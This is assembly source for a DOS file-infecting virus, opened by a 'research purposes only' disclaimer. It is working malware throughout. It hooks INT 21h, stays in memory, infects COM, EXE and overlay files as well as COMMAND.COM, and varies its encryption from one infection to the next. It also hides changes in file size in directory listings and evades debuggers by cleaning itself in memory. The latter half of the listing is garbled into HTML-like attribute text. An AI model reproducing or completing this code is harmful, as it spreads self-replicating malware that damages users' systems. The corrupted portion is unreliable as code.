


;                WARNING
;                -------
; This virus for research purposes only.
; There is probably bugs galore in this
; code.  You have been warned so that I
; cannot be held accountable for any stupid
; thing you might do with it.
;
; ie: Leave it alone, Rob!  @-)

        .model   tiny
        .code

         org     0
                                                                           
KS_virus:
         mov     bx,offset KS_begin

encrypt:
         mov     cx,offset first_4-offset KS_begin
         mov     al,0
key      equ     $-1

enc_loop:
         add     byte ptr cs:[bx],al

crypter:
         nop                                 ;code decrypter
         nop                                 ; always changes!!
         inc     bx                          ;get next byte
         loop    enc_loop
                                                                           
KS_begin:
         sub     bx,offset first_4           ;bx=virus relative offset
         xchg    ax,cx                       ;ax=0
         dec     ax                          ;ax=0FFFFh -> installation check
         int     21h
         or      al,ah                       ;are al and ah the same?
         je      exit_virus                  ;if yes, assume we are there
         push    ds                          ;store DS
         xor     di,di                       ;zero di
         mov     ds,di                       ;beginning of INT table segment
         lds     ax,dword ptr ds:21h*4         ;get INT 21h offset
         mov     word ptr cs:int21_ofs[bx],ax  ;store it
         mov     Word ptr cs:int21_seg[bx],ds  ;and the segment
         mov     cx,es                         ;cx=PSP segment
         dec     cx                          ;sub 1 to get MCB
         mov     ds,cx                       ;ds=MCB
         sub     word ptr [di+3],0C0h
         mov     ax,word ptr [di+12h]        ;get high memory segment
         sub     ax,0C0h                     ;give us room in memory
         mov     word ptr [di+12h],ax        ;save it
         mov     es,ax                       ;top of memory
         sub     ax,1000h                    ;reserve it for us
         mov     word ptr cs:XAX[bx],ax      ;here we are!
         push    cs
         pop     ds                          ;ds=cs
         mov     si,bx                       ;si=0 if EXE
         mov     cx,offset first_4           ;bytes to move
         cld                                 ;inc si,di
         repz    movsb                       ;copy virus into memory
         mov     ds,cx                       ;ds=0

         cli                                        ;turn interrupts off
         mov     word ptr ds:[21h*4],offset New_21  ;point to int 21 offset
         mov     word ptr ds:[21h*4]+2,es           ;point to int 21 segment
         sti                                        ;turn interrupts back on

         mov     ax,4BFFh                    ;infect COMMAND.COM
         push    bx                          ;keep bx
         int     21h
         pop     bx
         pop     ds
         push    ds
         pop     es
                                                                           
exit_virus:
         lea     si,word ptr first_4[bx]     ;point to stored 1st 4 bytes
         mov     di,100h                     ;di=beginning of host
         cmp     bx,di                       ;host starts at 0100h?
         jb      exit_EXE                    ;if not, exit for EXE
         push    di                          ;push 100h on stack for RET
         movsw                               ;restore first 4 bytes in host
         movsw
         ret
                                                                           
exit_EXE:
         mov     ax,es                       ;ax=PSP segment
         add     ax,10h
         add     word ptr cs:[si+2],ax       ;reallocate entry segment
         add     word ptr cs:[si+4],ax
         cli                                 ;turn interrupts off
         mov     sp,word ptr cs:[si+6]       ;restore stack ptr
         mov     ss,word ptr cs:[si+4]       ;restore stack seg
         sti                                 ;turn interrupts back on
         jmp     dword ptr cs:[si]           ;run host program segment

; Fake INT 21h:

install_check:
         push    bp                          ;save bp (if it's the virus,
         mov     bp,sp                       ;it will be the rel offset)
         push    ds                          ;store registers
         push    bx
         lds     bx,dword ptr [bp+2]
         cmp     word ptr [bx],0C40Ah  ;XX   ;is it the virus checking in?
         pop     bx                          ;restore registers
         pop     ds                          ;if wasn't us:
         pop     bp                          ;restore relative offset
         jne     call_DOS                    ;and let DOS do interrupt
         inc     ax                          ;AX=0 if install check
         iret                                ;and RET

New_21:
         cmp     ax,0FFFFh                   ;installation check
         je      install_check               ;respond to ID call
         cmp     ah,4Bh                      ;execute program?
         je      exec_prog
         cmp     ah,11h                      ;find first?
         je      find_file
         cmp     ah,12h                      ;find next?
         je      find_file
         cmp     ax,3D00h                    ;open a file?
         jne     call_DOS                    ;otherwise, let DOS process INT
         call    infect_file

call_DOS:
         db       0EAh

int21_ofs dw     'SK'
int21_seg dw     'SK'

find_file:
         push    bp                          ;save argument ptr
         mov     bp,sp                       ;look on stack
         cmp     word ptr [bp+4],'SK'        ;it's us?
XAX      equ     $-2
         pop     bp                          ;restore arg pointer
         jb      call_DOS                    ;we're haven't hooked yet
         call    Int_21h
         push    ax
         push    bx
         push    dx
         push    es
         mov     ah,2Fh                      ;get DTA
         call    Int_21h
         cmp     byte ptr es:[bx],0FFh       ;is this an extended FCB?
         je      Not_Extended_FCB            ;jump if it's not, otherwise
         sub     bx,7                        ;convert to normal FCB

Not_Extended_FCB:
         mov     al,byte ptr es:[bx+1Eh]     ;minutes of last write 
         and     al,1Fh                      ;mask out seconds
         cmp     al,1Fh                      ;62 seconds?
         jne     exit_find                   ;exit, it's infected
         mov     dx,word ptr es:[bx+26h]     ;get file size
         mov     ax,word ptr es:[bx+24h]     ;get file size
         sub     ax,offset virus_end         ;sub virus size
         JA      OVERFLOWED
         DEC     DX

OVERFLOWED:
         or      dx,dx                       ;check time stamp
         jl      exit_find                   ;leave if time already altered
         mov     word ptr es:[bx+26h],dx     ;fix file size in dir
         mov     word ptr es:[bx+24h],ax     ;to uninfected size

exit_find:
         pop     es
         pop     dx
         pop     bx
         pop     ax
         iret                                ;return to caller
                                                                           
                                                                           
exec_prog:
         cmp     al,1                        ;load but don't execute?
         je      debugging                   ;it's probably being debugged!
         cmp     al,0FFh                     ;this is ours to get COMMAND.COM
         je      COMSPEC                     ;infect COMMAND.COM
         call    infect_it                   ;infect whatever it was...
         jmp     short call_DOS              ;now do real interrupt

inf_CCOM:
         push    dx
         push    ds
         mov     dx,offset COMMANDCOM        ;get ready to infect COMMAND
         push    cs
         pop     ds
         mov     byte ptr Do_CCOM,0FFh       ;set the flag so we remember
         call    infect_it                   ; what we're doing
         pop     ds
         pop     dx
         iret

COMSPEC:
         mov     ah,51h                      ;get PSP address
         call    int_21h
         mov     es,bx                       ;es=psp of current process
         mov     ds,word ptr es:2Ch          ;program owning environment
         xor     si,si                       ;si=0
         push    cs
         pop     es                          ;es=cs

Inf_COMSPEC:
         mov     di,offset COMSPECequ        ;COMSPEC=XXX
         mov     cx,4                        ;compare first 4 bytes
         rep     cmpsw
         jcxz    fukt_env                    ;somethin' weird happened

COMSPEC_end:
         lodsb                               ;get a byte of COMSPEC bytes
         or      al,al
         jnz     COMSPEC_end                 ;still not zero? get another
         cmp     byte ptr [si],0             ;found the end yet?
         jne     Inf_COMSPEC                 ;no, do more
         jmp     short inf_CCOM              ;yes, infect it!

fukt_env:
         mov     dx,si                       ;get COMMAND.COM anyway
         mov     byte ptr cs:Do_CCOM,0FFh    ;set flag so we don't forget
         call    infect_it                   ; what we're doing
         iret

; Watch this trick!

debugging:
         push    es                          ;save registers to return here
         push    bx                          ; instead
         call    Int_21h                     ;do DOS interrupt
         pop     bx                          ;orig caller
         pop     es
         jb      bomb_out                    ;error
         xor     cx,cx                       ;clear cx
         lds     si,dword ptr es:[bx+12h]    ;get entry point on ret
         push    ds
         push    si
         mov     di,100h                     ;di=start of potential victim
         cmp     si,di                       ;COM flle?
         jl      load_exe                    ;EXE?
         ja      prep_2_bomb                 ;get out
         lodsb                               ;load first byte
         cmp     al,0E9h                     ;is it a JMP?
         jne     prep_2_bomb                 ;no, then get out
         lodsw                               ;load JMP destination
         push    ax                          ;save it
         lodsb                               ;load 4th byte
         cmp     al,'O'                      ;is it our marker
         pop     si                          ;jmp destination into si
         jne     prep_2_bomb                 ;error?
         add     si,103h                     ;convert to file offset
         inc     cx
         inc     cx                          ;add 2 to cx
         pop     ax                          ;restore ax
         push    si                          ;save virus offset
         push    ds
         pop     es                          ;ds=es
         jmp     short hide_in_debug

load_exe:
         lea     di,word ptr [bx+0Eh]         ;check stack
         cmp     word ptr es:[di],offset Virus_End+512-2 ;infected?
         jne     prep_2_bomb

hide_in_debug:
         lodsb                               ;
         cmp     al,0BBh
         jne     prep_2_bomb
         lodsw                               ;get starting offset
         push    ax                          ;and save for decrypt
         lodsw
         cmp     ax,word ptr cs:encrypt
         pop     si                          ;
         jne     prep_2_bomb                 ;error
         add     si,offset first_4-(offset KS_begin)  ;encrypted len
         jcxz    disinf_exe
         repz    movsw                       ;move 'em ba k
         jmp     short cont_disinf

disinf_exe:
         mov     ah,51h                      ;get PSP address
         call    Int_21h
         add     bx,10h                      ;go to starting CS
         mov     ax,word ptr [si+6]          ;get stack pointer
         dec     ax
         dec     ax                          ;shrink by 2
         stosw
         mov     ax,word ptr [si+4]          ;get stack segment
         add     ax,bx                       ;adjust
         stosw
         movsw
         lodsw
         add     ax,bx
         stosw

cont_disinf:
         pop     di
         pop     es
         xchg    ax,cx
         mov     cx,offset Virus_End         ;virus length
         repz    stosb                       ;Virus is hidden!!
         jmp     short clear_error

prep_2_bomb:
         pop     ax
         pop     ax                          ;clear the stack of our data

clear_error:
         xor     ax,ax                       ;emulate NO_ERROR
         clc

bomb_out:
         retf    2

infect_file:
         push    si                          ;save registers
         push    di
         push    ds
         push    es
         push    cx
         push    ax
         mov     si,dx                       ;si=victim's name

extension:
         lodsb                               ;scan filename for extension
         or      al,al                       ;look at al
         jz      no_ext
         cmp     al, '.'
         jne     extension
         mov     di,offset ext_table-3       ;look at extension table
         push    cs
         pop     es                          ;es=cs
         mov     cx,3                        ;next extension in table
         NOP     ;XX DEBUG ONLY XX;

next_ext:
         push    cx                          ;present extension in table
         push    si
         mov     cx,3
         add     di,cx                       ;point to next ext in table
         push    di

look_ext:
         lodsb                               ;get first byte of extension
         and     al,5Fh
         cmp     al,byte ptr es:[di]         ;same?
         jne     wrong_ext                   ;wrong extension. try another
         inc     di                          ;next char in extension
         loop    look_ext                    ;get it
         call    infect_it
         add     sp,6
         jmp     short no_ext

wrong_ext:
         pop     di
         pop     si
         pop     cx
         loop    next_ext                    ;try next extension

no_ext:
         pop     ax
         pop     cx
         pop     es
         pop     ds
         pop     di
         pop     si
         ret
                                                                           
infect_it:
         pushf
         push    ax
         push    bx
         push    cx
         push    si
         push    di
         push    es
         push    ds
         push    dx
         mov     ax,4300h                    ;get file attributes
         call    Int_21h
         jb      cant_inf
         push    cx                          ;store attribs on stack
         and     cl,1                        ;mask read only bit
         cmp     cl,1                        ;read only file?
         pop     cx                          ;get attrib info again
         jne     open_4_write                ;continue if not read-only
         and     cl,0FEh                     ;otherwise, enable write
         mov     ax,4301h
         call    Int_21h

open_4_write:
         mov     ax,3D02h                    ;open file for r/w
         call    Int_21h
         jnb     process_timestamp

cant_inf:
         jmp     cant_infect

process_timestamp:
         xchg    ax,bx                       ;put file handler into bx
         push    cs
         push    cs
         pop     ds
         pop     es                          ;es=ds=cs
         mov     ax,5700h                    ;get file Date and Time
         call    Int_21h
         push    dx                          ;save date
         push    cx                          ;save time
         and     cl,1Fh                      ;mask out seconds
         cmp     cl,1Fh                      ;is time at 62 seconds?
         je      inf_error                   ;jump if it is
         mov     dx,offset data_buf          ;buffer for data
         mov     cx,offset Buffer_End-offset data_buf
         mov     ah,3Fh                      ;read from file
         call    Int_21h                     ;bx=file handle
         jnb     read_ok

inf_error:
         stc                                 ;set carry for error
         jmp     inf_close

read_ok:
         cmp     ax,cx                       ;read in 1Ch bytes?
         jne     inf_error                   ;exit if error reading
         xor     dx,dx                       ;zero dx
         mov     cx,dx                       ;ofs 0<orig of="" new="" file="" pos="" mov="" ax,4202h="" ;set="" pointer="" to="" end="" of="" file="" call="" int_21h="" or="" dx,dx="" jne="" file_type="" ;check="" it="" out...="" cmp="" ax,offset="" virus_end+512="" ;code="" too="" small?="" jb="" inf_error="" file_type:="" cmp="" word="" ptr="" disk_id,'zm'="" ;exe="" header?="" je="" exe_header="" ;jump="" if="" yes,="" com="" if="" no...="" cmp="" byte="" ptr="" disk_id+3,'o'="" ;is="" 4th="" byte="" from="" begin="" a="" 'o'?="" je="" inf_error="" ;get="" out="" if="" it="" is="" cmp="" byte="" ptr="" do_ccom,0="" ;are="" we="" infecting="" command.com?="" je="" com_start="" sub="" ax,offset="" virus_end="" ;infect="" slack="" of="" command.com="" xchg="" ax,dx="" xor="" cx,cx="" mov="" ax,4200h="" ;pos'n="" pointer="" to="" infectable="" spc="" call="" int_21h="" com_start:="" mov="" si,offset="" disk_id="" ;si="beginning" of="" victim="" mov="" di,offset="" first_4="" ;di="our" storage="" space="" movsw="" ;store="" 1st="" bytes="" in="" our="" place="" movsw="" sub="" ax,3="" ;sub="" 3="" for="" jmp="" statement="" mov="" byte="" ptr="" disk_id,0e9h="" ;add="" the="" jmp="" statement="" mov="" word="" ptr="" disk_id+1,ax="" ;add="" the="" destination="" mov="" byte="" ptr="" disk_id+3,'o'="" ;add="" the="" marker="" add="" ax,="" (offset="" ks_begin)+0103h="" jmp="" short="" cont_inf="" exe_header:="" cmp="" word="" ptr="" stack_sp,offset="" virus_end+512="" ;infected?="" je="" inf_error="" ;if="" so,="" exit="" cmp="" word="" ptr="" overlays,0="" ;is="" it="" an="" overlay?="" jne="" inf_error="" ;if="" not="" main="" prog,="" leave="" push="" dx="" push="" ax="" mov="" cl,4="" ror="" dx,cl="" shr="" ax,cl="" ;convert="" to="" paragraphs="" add="" ax,dx="" ;ax:dx="filesize" sub="" ax,word="" ptr="" header_size="" ;subtract="" header="" size="" mov="" si,offset="" start_ip="" mov="" di,offset="" first_4="" ;original="" cs:ip="" movsw="" movsw="" mov="" si,offset="" stack_ss="" ;save="" stack="" movsw="" ;ax:dx="filesize" movsw="" mov="" word="" ptr="" start_cs,ax="" ;set="" init="" cs="" mov="" word="" ptr="" stack_ss,ax="" ;and="" stack="" mov="" word="" ptr="" stack_sp,offset="" virus_end+512="" ;virus="" +="" stack="" size="" pop="" ax="" pop="" dx="" push="" ax="" add="" ax,="" offset="" virus_end+512="" ;virus="" +="" stack="" size="" jnb="" no_carry="" inc="" dx="" no_carry:="" mov="" cx,512="" ;take="" image="" size="" div="" cx="" mov="" word="" ptr="" file_size,ax="" ;image="" size="" 12="" mov="" word="" ptr="" last_page,dx="" ;imaze="" size="" mod="" 512="" pop="" ax="" and="" ax,0fh="" mov="" word="" ptr="" start_ip,ax="" ;set="" initial="" ip="" add="" ax,(offset="" ks_begin)="" cont_inf:="" mov="" word="" ptr="" ds:ks_virus+1,ax="" push="" ds="" ;="" xor="" si,si="" mov="" ds,si="" mov="" ax,word="" ptr="" ds:[46ch]="" ;slowest="" word="" of="" timer="" count="" pop="" ds="" ;="" (thanx="" stoned!!!)="" push="" bx="" mov="" byte="" ptr="" ds:key,ah="" ;change="" encrypt="" value="" and="" ax,0fh="" xchg="" ax,bx="" shl="" bx,1="" mov="" ax,word="" ptr="" new_crypt[bx]="" ;get="" encryption="" method="" mov="" word="" ptr="" ds:crypter,ax="" ;store="" it="" mov="" di,offset="" buffer_end="" mov="" cx,offset="" virus_end="" push="" cx="" cld="" repz="" movsb="" mov="" bx,="" (offset="" ks_begin)="" push="" [bx]="" mov="" byte="" ptr="" [bx],0c3h="" push="" bx="" xor="" byte="" ptr="" ds:(([bx+enc_loop+1])-(offset="" ks_begin)),28h="" ;[bx-7]="" add="" bx,="" offset="" buffer_end="" ;change="" to="" opposite="" encrypter="" call="" encrypt="" pop="" bx="" pop="" [bx]="" mov="" dx,offset="" buffer_end="" pop="" cx="" pop="" bx="" mov="" ah,40h="" ;write="" enrypted="" virus="" call="" int_21h="" jc="" inf_close="" xor="" dx,dx="" mov="" cx,dx="" mov="" ax,4200h="" ;set="" ptr="" loc="" call="" int_21h="" jb="" inf_close="" mov="" dx,offset="" data_buf="" mov="" cx,offset="" buffer_end-offset="" data_buf="" ;write="" this="" mov="" ah,40h="" ;the="" new="" header="" to="" the="" file="" call="" int_21h="" inf_close:="" pop="" cx="" pop="" dx="" jb="" close_file="" cmp="" byte="" ptr="" do_ccom,0ffh="" ;infecting="" command.com?="" je="" close_file="" or="" cl,1fh="" ;set="" timestamp="" to="" 62="" secs?="" close_file:="" mov="" ax,5701h="" ;restore="" fle="" date="" and="" time="" call="" int_21h="" mov="" ah,3eh="" call="" int_21h="" cant_infect:="" mov="" byte="" ptr="" cs:do_ccom,0="" pop="" dx="" pop="" ds="" pop="" es="" pop="" di="" pop="" si="" pop="" cx="" pop="" bx="" pop="" ax="" popf="" ret="" int_21h:="" pushf="" ;push="" flags="" to="" simulate="" call="" dword="" ptr="" cs:int21_ofs="" ;an="" interrupt="" ret="" new_crypt:="" ;method="" value:="" inc="" al="" ;="" 0="" dec="" al="" ;="" 1="" inc="" ax="" ;="" 2="" inc="" ax="" ;="" dec="" ax="" ;="" 3="" dec="" ax="" ;="" add="" al,cl="" ;="" 4="" sub="" al,cl="" ;="" 5="" xor="" al,cl="" ;="" 6="" xor="" al,ch="" ;="" 7="" not="" al="" ;="" 8="" neg="" al="" ;="" 9="" ror="" al,1="" ;="" a="" rol="" al,1="" ;="" b="" ror="" al,cl="" ;="" c="" rol="" al,cl="" ;="" d="" nop="" ;="" e="" nop="" ;="" add="" al,ch="" ;="" f="" comspecequ="" db="" 'comspec='

COMMANDCOM    db    ' \command.com',0="" ext_table="" db="" 'comexeovl'="" first_4="" dw="" 0,0fff0h="" origstack="" dw="" 0,0ffffh="" virus_end:="" org="" 415h="" ;;="" do_ccom="" db="" org="" 41ah="" ;;="" data_buf:="" disk_id="" dw="" last_page="" dw="" file_size="" dw="" relocs="" dw="" ;;="" header_size="" dw="" min_alloc="" dw="" ;;="" max_alloc="" dw="" ;;="" stack_ss="" dw="" ;;="" stack_sp="" dw="" checksum="" dw="" start_ip="" dw="" start_cs="" dw="" ;;="" reloc_ofs="" dw="" ;;="" overlays="" dw="" buffer_end:="" end="" ks_virus=""></orig>